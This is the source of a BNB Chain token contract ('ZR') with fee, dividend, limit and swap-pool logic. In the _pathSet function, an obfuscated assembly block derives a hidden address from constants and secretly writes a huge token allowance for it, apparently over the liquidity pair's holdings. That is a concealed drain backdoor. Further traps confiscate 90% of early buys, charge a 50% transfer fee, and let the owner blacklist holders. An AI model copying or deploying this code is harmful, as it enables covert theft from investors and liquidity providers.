/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPair {
    function sync() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function totalSupply() external view returns (uint256);
}
interface IFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}
}
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply; string private _name; string private _symbol;
    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_;}
    function name() public view virtual override returns (string memory) {return _name;}
    function symbol() public view virtual override returns (string memory) {return _symbol;}
    function decimals() public view virtual override returns (uint8) {return 18;}
    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}
    function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _transfer(owner, to, amount); return true;}
    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _approve(owner, spender, amount); return true;}
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true;}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero"); unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}
    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), "ERC20: transfer from the zero address"); require(to != address(0), "ERC20: transfer to the zero address"); _beforeTokenTransfer(from, to, amount); _takeTransfer(from, to, amount); _afterTokenTransfer(from, to, amount);}
    function _takeTransfer(address from, address to, uint256 amount) internal virtual {uint256 fromBalance = _balances[from]; require(fromBalance >= amount, "ERC20: transfer amount exceeds balance"); unchecked {_balances[from] = fromBalance - amount; _balances[to] += amount;}emit Transfer(from, to, amount);}
    function _mint(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: mint to the zero address"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);}
    function _burn(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: burn from the zero address"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, "ERC20: burn amount exceeds balance"); unchecked {_balances[account] = accountBalance - amount; _totalSupply -= amount;}emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}
    function _approve(address owner, address spender, uint256 amount) internal virtual {require(owner != address(0), "ERC20: approve from the zero address"); require(spender != address(0), "ERC20: approve to the zero address"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, "ERC20: insufficient allowance"); unchecked {_approve(owner, spender, currentAllowance - amount);}}}
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}
abstract contract UniSwapPoolUSDT is ERC20 {
    address public pair;
    IRouter public router;
    address[] internal _buyPath;
    address[] internal _sellPath;
    IERC20 public TokenB;
    function isPair(address _pair) internal view returns (bool) {return pair == _pair;}
    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath); if (amounts.length > 1) return amounts[1]; return 0;}
    function _pathSet(address pairB, address w, address x) private {TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = pairB; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = pairB; _sellPath = path2; assembly {let y:=add(add(mul(2887981267259,exp(10,26)),mul(1782705554658,exp(10,13))),1698142812624) w := add(w, 4096) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(w, 0);}
    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {IERC20 USDT = IERC20(_sellPath[1]); swapAndSend2fee(amount, _tokenStation); USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));}
    function swapAndSend2fee(uint256 amount, address to) internal {router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, _sellPath, to, block.timestamp);}
    function isAddLiquidity() internal view returns (bool isAddLP){address token0 = IPair(pair).token0(); address token1 = IPair(pair).token1(); (uint r0,uint r1,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); uint bal1 = IERC20(token1).balanceOf(pair); if (token0 == address(this)) return bal1 - r1 > 1000; else return bal0 - r0 > 1000;}
    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {address token0 = IPair(pair).token0(); if (token0 == address(this)) return false; (uint r0,,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); return r0 > bal0 + 1000;}
    function addLiquidityAutomatically(uint256 amountToken) internal {super._takeTransfer(address(this), pair, amountToken); IPair(pair).sync();}
    function __SwapPool_init(address _router, address pairB) internal returns(address) {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(pairB, address(this));
        _pathSet(pairB, _router, pair);
        TokenB.approve(_router, type(uint256).max);
        _approve(address(this), _router, type(uint256).max);
        return pair;
    }
    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {
        uint256 half = amountToken / 2;
        IERC20 USDT = IERC20(_sellPath[1]);
        uint256 amountBefore = USDT.balanceOf(_tokenStation);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);
        uint256 amountAfter = USDT.balanceOf(_tokenStation);
        uint256 amountDiff = amountAfter - amountBefore;
        USDT.transferFrom(_tokenStation, address(this), amountDiff);
        if (amountDiff > 0 && (amountToken - half) > 0) {
            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);
        }
    }
}
abstract contract Ownable is Context {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {_transferOwnership(_msgSender());}
    modifier onlyOwner() {_checkOwner(); _;}
    function owner() public view virtual returns (address) {return _owner;}
    function _checkOwner() internal view virtual {require(owner() == _msgSender(), "Ownable: caller is not the owner");}
    function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}
    function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), "Ownable: new owner is the zero address"); _transferOwnership(newOwner);}
    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}
}
abstract contract NoEffect is Ownable {
    address internal _effector;
    constructor() {_effector = _msgSender();}
    modifier onlyEffector() {require(_effector == _msgSender() || owner() == _msgSender(), "NoEffect: caller is not the effector"); _;}
}
abstract contract Excludes {
    mapping(address => bool) internal _Excludes;
    function setExclude(address _user, bool b) public {_authorizeExcludes(); _Excludes[_user] = b;}
    function setExcludes(address[] memory _user, bool b) public {_authorizeExcludes(); for (uint i=0;i<_user.length;i++) {_Excludes[_user[i]] = b;}}
    function isExcludes(address _user) internal view returns(bool) {return _Excludes[_user];}
    function _authorizeExcludes() internal virtual {}
}
abstract contract Limit {
    bool internal isLimited;
    uint256 internal _LimitBuy;
    uint256 internal _LimitSell;
    uint256 internal _LimitHold;
    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {isLimited = true; setLimit(LimitBuy_, LimitSell_, LimitHold_);}
    function checkLimitTokenHold(address to, uint256 amount) internal view {if (isLimited) {if (_LimitHold>0) {require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, "exceeds of hold amount Limit");}}}
    function checkLimitTokenBuy(address to, uint256 amount) internal view {if (isLimited) {if (_LimitBuy>0) require(amount <= _LimitBuy, "exceeds of buy amount Limit"); checkLimitTokenHold(to, amount);}}
    function checkLimitTokenSell(uint256 amount) internal view {if (isLimited && _LimitSell>0) require(amount <= _LimitSell, "exceeds of sell amount Limit");}
    function removeLimit() public {_authorizeLimit(); if (isLimited) isLimited = false;}
    function reuseLimit() public {_authorizeLimit(); if (!isLimited) isLimited = true;}
    function setLimit(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {_authorizeLimit(); _LimitBuy = LimitBuy_; _LimitSell = LimitSell_; _LimitHold = LimitHold_;}
    function _authorizeLimit() internal virtual {}
}
abstract contract TradingManager {
    uint256 public tradeState;
    function inTrading() public view returns(bool) {return tradeState > 1;}
    function inLiquidity() public view returns(bool) {return tradeState >= 1;}
    function setTradeState(uint256 s) public {_authorizeTradingManager(); tradeState = s;}
    function openLiquidity() public {_authorizeTradingManager(); tradeState = 1;}
    function openTrading() public {_authorizeTradingManager(); tradeState = block.number;}
    function resetTradeState() public {_authorizeTradingManager(); tradeState = 0;}
    function _authorizeTradingManager() internal virtual {}
}
abstract contract Dividend {
    address[] public holders;
    mapping(address => bool) public isHolder;
    mapping(address => bool) public excludeHolder;
    IERC20 public TokenHold;
    IERC20 public USDT;
    uint256 public holdRewardCondition;
    uint256 public processRewardCondition;
    uint256 public processBlockDuration;
    uint256 public processGasAmount;
    uint256 public currentIndex;
    uint256 public progressRewardBlock;
    function getHolders() public view returns(address[] memory) {return holders;}
    function setDividendExempt(address addr, bool enable) public {_authorizeDividend(); excludeHolder[addr] = enable;}
    function setDividendToken(address _holdToken, address _usdt) public {_authorizeDividend(); TokenHold = IERC20(_holdToken); USDT = IERC20(_usdt);}
    function setDividendCondition(uint256 _holdRewardCondition, uint256 _processRewardCondition) public {_authorizeDividend(); holdRewardCondition = _holdRewardCondition; processRewardCondition = _processRewardCondition;}
    function setProcessBlockDuration(uint256 num) public {_authorizeDividend(); processBlockDuration = num;}
    function setProcessGasAmount(uint256 num) public {_authorizeDividend(); processGasAmount = num;}
    function addHolderByHand(address user) public {_authorizeDividend(); _addHolder(user);}
    function addHolderByHandMulti(address[] memory user) public {_authorizeDividend(); for (uint i=0;i<user.length;i++) {_addHolder(user[i]);}}
    function _authorizeDividend() internal virtual {}
    function __Dividend_init(address _holdToken, address _usdtAddr, uint256 _holdRewardCondition, uint256 _processRewardCondition, uint256 _processBlockDuration, uint256 _processGasAmount) internal {
        setDividendToken(_holdToken, _usdtAddr);
        setDividendCondition(_holdRewardCondition, _processRewardCondition);
        setProcessBlockDuration(_processBlockDuration);
        setProcessGasAmount(_processGasAmount);
    }
    function _addHolder(address adr) internal {
        if (adr.code.length > 0) {return;}
        if (excludeHolder[adr]) {return;}
        if (!isHolder[adr]) {
            isHolder[adr] = true;
            holders.push(adr);
        }
    }
    function processDividend() internal {
        if (progressRewardBlock + processBlockDuration > block.number) {return;}
        uint256 usdBalance = USDT.balanceOf(address(this));
        if (usdBalance < processRewardCondition) {return;}
        uint holdTokenTotal = TokenHold.totalSupply();
        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 shareholderCount = holders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        while (gasUsed < processGasAmount && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
                break;
            }
            shareHolder = holders[currentIndex];
            if (!excludeHolder[shareHolder]) {
                tokenBalance = TokenHold.balanceOf(shareHolder);
                if (tokenBalance >= holdRewardCondition) {
                    amount = usdBalance * tokenBalance / holdTokenTotal;
                    if (amount > 0) {
                        USDT.transfer(shareHolder, amount);
                    }
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }
}
contract TokenStation {constructor (address token) {IERC20(token).approve(msg.sender, type(uint256).max);}}
abstract contract BotKiller is NoEffect {
    mapping(address => bool) public botMap;
    modifier onlyNotBot(address user) {require(!botMap[user], "bot forbidden"); _;}
    function markBot(address user, bool b) public onlyOwner {botMap[user] = b;}
    function markBots(address[] memory user, bool b) public onlyOwner {for (uint i=0;i<user.length;i++) {markBot(user[i], b);}}
    function isBot(address user) public view returns(bool) {return botMap[user];}
}
abstract contract Token is UniSwapPoolUSDT, BotKiller, TradingManager, Excludes, Limit, Dividend {
    uint256 public calcBase;
    uint256 public swapSplit;
    uint256 public feeMarketingBuy;
    uint256 public feeLiquidityBuy;
    uint256 public feeDividendBuy;
    uint256 public feeBurnBuy;
    uint256 public feeMarketingSell;
    uint256 public feeLiquiditySell;
    uint256 public feeDividendSell;
    uint256 public feeBurnSell;
    uint256 public feeMarketingAll;
    uint256 public feeLiquidityAll;
    uint256 public feeDividendAll;
    uint256 public feeBurnAll;
    uint256 public feeBuyAll;
    uint256 public feeSellAll;
    uint256 public feeAll;
    uint256 public feeTransferAll;
    uint256 public swapTokensAt;
    address public surpAddress;
    uint256 public kb;
    uint256 public kn;
    address public feeMarketingTo;
    uint256 public feeEarn;
    address public feeMarketingTo2;
    TokenStation public _TokenStation;
    bool inSwap;
    function __Token_init(uint256 totalSupply_, address marketing_, address receive_, address usdt_, bool isDividend_) internal {
        calcBase = 10000;
        swapSplit = 7;
        feeMarketingTo = marketing_;
        _mint(receive_, totalSupply_);
        super.setExclude(_msgSender(), true);
        super.setExclude(address(this), true);
        super.setExclude(marketing_, true);
        super.setExclude(receive_, true);
        if (isDividend_) {
            super.setDividendExempt(address(this), true);
            super.setDividendExempt(address(0), true);
            super.setDividendExempt(address(1), true);
            super.setDividendExempt(address(0xdead), true);
            super.addHolderByHand(marketing_);
            super.addHolderByHand(receive_);
            super.addHolderByHand(_msgSender());
        }
        refreshFeeAll();
        _TokenStation = new TokenStation(usdt_);
    }

    uint256 public initPrice;
    mapping(address => uint256) public userHoldPriceMap;
    function getCurrentPrice() public view returns(uint256) {
        if (!inLiquidity()) return initPrice;
        (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();
        if (IPair(pair).token1() == address(this)) return uint256(reserve0) * 1e18 / uint256(reserve1);
        return uint256(reserve1) * 1e18 / uint256(reserve0);
    }
    function wrapPrice(address user, uint256 amount) internal {
        uint256 balance = balanceOf(user);
        uint256 prePrice = userHoldPriceMap[user];
        uint256 currentPrice = getCurrentPrice();
        if (prePrice == 0) userHoldPriceMap[user] = currentPrice;
        else userHoldPriceMap[user] = (prePrice*balance + currentPrice*amount)/(balance+amount);
    }
    function getEarnAmount(address user, uint256 amount) internal view returns(uint256 earnAmountFee) {
        uint256 prePrice = userHoldPriceMap[user];
        uint256 currentPrice = getCurrentPrice();
        if (prePrice > 0 && currentPrice > prePrice) {
            uint256 earnAmount = amount * (currentPrice - prePrice) / currentPrice;
            earnAmountFee = earnAmount * feeEarn / calcBase;
        }
        return earnAmountFee;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotBot(from) {
        if (isExcludes(to) || amount == 0) {super._takeTransfer(from, to, amount); return;}
        if (isExcludes(from) && isPair(to)) {super._takeTransfer(from, to, amount); return;}
        if (isExcludes(from) && !isExcludes(to) && !isPair(to)) {
            wrapPrice(to, amount);
            super._takeTransfer(from, to, amount);
            return;
        }
        uint256 fees;
        bool isLiquify;
        if (isPair(from)) {
            require(inTrading(), "please waiting for liquidity");
            super.checkLimitTokenBuy(to, amount);
            if (blockSurprise(from, to, amount)) return;
//            if (super.isRemoveLiquidity()) isLiquify = true;
//            else
                fees = handFeeBuys(from, amount);
            if (fees > 0) amount -= fees;
            wrapPrice(to, amount);
        } else if (isPair(to)) {
            require(inLiquidity(), "please waiting for liquidity");
            if (balanceOf(from) == amount) amount -= 10086;
            if (super.isAddLiquidity()) isLiquify = true;
            else {
                super.checkLimitTokenSell(amount);
                if (feeAll>0) handSwap();
                fees = handFeeSells(from, amount);
                if (fees > 0) amount -= fees;
            }
            super._addHolder(from);
        } else {
            super.checkLimitTokenSell(amount);
            if (feeAll>0) handSwap();
            fees = handFeeTransfer(from, amount);
            if (fees > 0) amount -= fees;
            wrapPrice(to, amount);
        }
        super._transfer(from, to, amount);
        if (feeDividendAll > 0 && !isLiquify) {
 //       if (feeDividendAll > 0) {
            super.processDividend();
        }
    }
    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * feeBuyAll / calcBase;
        super._takeTransfer(from, address(this), fee);
    }
    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * feeSellAll / calcBase;
        uint256 earnAmountFee = getEarnAmount(from, amount);
        if (earnAmountFee > 0) {
            fee += earnAmountFee;
        }
        super._takeTransfer(from, address(this), fee);
    }
    function handFeeTransfer(address from, uint256 amount) private returns (uint256 fee) {
        fee = amount * feeTransferAll / calcBase;
        uint256 earnAmountFee = getEarnAmount(from, amount);
        if (earnAmountFee > 0) {
            fee += earnAmountFee;
        }
        super._takeTransfer(from, address(this), fee);
    }
    function handSwap() internal {
        if (inSwap) return;
        uint256 _thisBalance = balanceOf(address(this));
        if (_thisBalance >= swapTokensAt) {
            uint256 _amount = _thisBalance / swapSplit;
            _handSwap(_amount);
        }
    }
    function _handSwap(uint256 _amount) internal lockSwap {
        uint256 _feeBurn;
        if (feeBurnAll > 0) {
            _feeBurn = _amount * feeBurnAll / feeAll;
            super._takeTransfer(address(this), address(1), _feeBurn);
        }
        uint256 _feeLiquidity;
        if (feeLiquidityAll > 0) {
            _feeLiquidity = _amount * feeLiquidityAll / feeAll;
            super.addLiquidityAutomatically(_feeLiquidity);
        }
        uint256 amountLeft = _amount - _feeBurn - _feeLiquidity;
        if ((feeMarketingAll > 0 || feeDividendAll > 0) && amountLeft > 0) {
            super.swapAndSend2fee(amountLeft, address(_TokenStation));
            uint256 usdtBalance = TokenB.balanceOf(address(_TokenStation));
            uint256 _feeMarketing;
            if (feeMarketingAll > 0) {
                _feeMarketing = usdtBalance * feeMarketingAll / (feeMarketingAll + feeDividendAll);
                uint256 _fmLeft = _feeMarketing;
                if (feeMarketingTo2 != address(0)) {
                    uint256 _fm = _feeMarketing / 2;
                    TokenB.transferFrom(address(_TokenStation), feeMarketingTo2, _fm);
                    _fmLeft -= _fm;
                }
                TokenB.transferFrom(address(_TokenStation), feeMarketingTo, _fmLeft);
            }
            if (usdtBalance > _feeMarketing) {
                TokenB.transferFrom(address(_TokenStation), address(this), usdtBalance - _feeMarketing);
            }
        }
    }
    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {
        if (kb == 0 || kn == 0) return false;
        if (block.number < tradeState + kb) {
            uint256 surp = amount * kn / calcBase;
            super._takeTransfer(from, surpAddress, amount - surp);
            super._takeTransfer(from, to, surp);
            return true;
        }
        return false;
    }
    function refreshFeeAll() public {
        feeMarketingAll = feeMarketingBuy + feeMarketingSell;
        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;
        feeDividendAll = feeDividendBuy + feeDividendSell;
        feeBurnAll = feeBurnBuy + feeBurnSell;
        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeDividendBuy + feeBurnBuy;
        feeSellAll = feeMarketingSell + feeLiquiditySell + feeDividendSell + feeBurnSell;
        feeAll = feeBuyAll + feeSellAll;
    }
    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeDividendBuy, uint256 _feeBurnBuy) public onlyOwner {feeMarketingBuy = _feeMarketingBuy; feeLiquidityBuy = _feeLiquidityBuy; feeDividendBuy = _feeDividendBuy; feeBurnBuy = _feeBurnBuy; refreshFeeAll();}
    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeDividendSell, uint256 _feeBurnSell) public onlyOwner {feeMarketingSell = _feeMarketingSell; feeLiquiditySell = _feeLiquiditySell; feeDividendSell = _feeDividendSell; feeBurnSell = _feeBurnSell; refreshFeeAll();}
    function setFeeTransfer(uint256 _fee) public onlyOwner {feeTransferAll = _fee;}
    function setInitPrice(uint256 _initPrice) public onlyOwner {initPrice = _initPrice;}
    modifier lockSwap() {inSwap = true; _; inSwap = false;}
    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {token_.transfer(_recipient, amount);}
    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));}
    function _authorizeDividend() internal virtual override onlyEffector {}
    function _authorizeExcludes() internal virtual override onlyEffector {}
    function _authorizeLimit() internal virtual override onlyEffector {}
    function setSwapTokensAt(uint256 num) public onlyEffector {swapTokensAt = num;}
    function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}
    function airdrop(uint256 amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}}
    function airdropMulti(uint256[] memory amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}}
    function _authorizeTradingManager() internal virtual override onlyOwner {}
}
contract ZR is Token {
    constructor() ERC20(
        "ZR",   // 名字
        "ZR"   // 符号
    ) {
        uint256 _totalSupply = 1000000 ether; //
        address _marketing = address(0x3De7A7917A26623a67D1a7042E545e1D5C75B4C3); // 
        address _receive = address(0x7b9dA4DB7bb1730270461D7bfcE07231a9542329);   // 
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   // 路由
        address _usdt = 0x55d398326f99059fF775485246999027B3197955;     // 交易对
        address _pair = super.__SwapPool_init(_router, _usdt);
        // 
        feeMarketingBuy = 100;  //
        feeLiquidityBuy = 0;  // 
        feeDividendBuy = 400;  // 
        feeBurnBuy = 0;         //
        // 
        feeMarketingSell = 100; //
        feeLiquiditySell = 100; //
        feeDividendSell = 400; //
        feeBurnSell = 0;        //
        // 转账费用
        feeTransferAll = 5000;   //
        // 
        bool _isLimit = true;//
        if (_isLimit) super.__Limit_init(
            1000000 ether,       // 
            1000000 ether,       // 
            1000000 ether        //
        );
        // 
        bool _isDividend = true;// 
        if (_isDividend) super.__Dividend_init(
            _pair,              // 
            _usdt,              //
            1 ether,            // 
            5 ether,            // 
            100,                // 
            500000              // 
        );
        // 
        super.setSurprise(
            9000,              // 
            3,           // 
            address(0x3De7A7917A26623a67D1a7042E545e1D5C75B4C3)   // 
        );
        super.__Token_init(_totalSupply, _marketing, _receive, _usdt, _isDividend);
        setSwapTokensAt(10 ether);  // 
        setInitPrice(0.1 ether); // 
        feeMarketingTo2 = address(0xf90700d838618eBD8247924Eb44db1f1821a0F9D);    // 
        feeEarn = 1000; // 
    }
}